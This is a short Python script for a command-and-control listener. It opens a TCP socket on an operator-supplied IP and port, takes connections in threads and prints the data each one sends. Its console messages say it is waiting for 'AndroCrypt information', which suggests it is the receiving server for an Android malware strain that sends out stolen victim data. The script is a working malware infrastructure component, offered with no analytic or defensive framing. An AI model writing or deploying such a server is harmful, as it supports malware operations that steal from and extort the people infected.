import socket
import threading
from datetime import datetime

class C2Listener:
    def __init__(self):
        self.host = ''  #Your IP here
        self.port = 0
        self.running = False
    
    def start(self):
        """starting C2"""
        self.running = True
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind((self.host, self.port))
            sock.listen(5)
            
            print(f"[C&C] listens on {self.host}:{self.port}")
            print("[C&C] waits for AndroCrypt information")
            
            while self.running:
                client, addr = sock.accept()
                print(f"[C&C] connection from {addr[0]}")
                
                
                thread = threading.Thread(target=self.handle_client, args=(client, addr))
                thread.daemon = True
                thread.start()
                
        except Exception as e:
            print(f"[C&C] error: {e}")
        finally:
            sock.close()
    
    def handle_client(self, client, addr):
        """Handles incoming information"""
        try:
            data = client.recv(4096).decode('utf-8')
            if data:
            
                self.display_info(addr[0], data)
                
        except:
            pass
        finally:
            client.close()
    
    def display_info(self, client_ip, data):
        """shows collected information"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"\n[{timestamp}]  from {client_ip}:")
        print(data)
        print("-" * 50)

if __name__ == "__main__":
    server = C2Listener()
    server.start()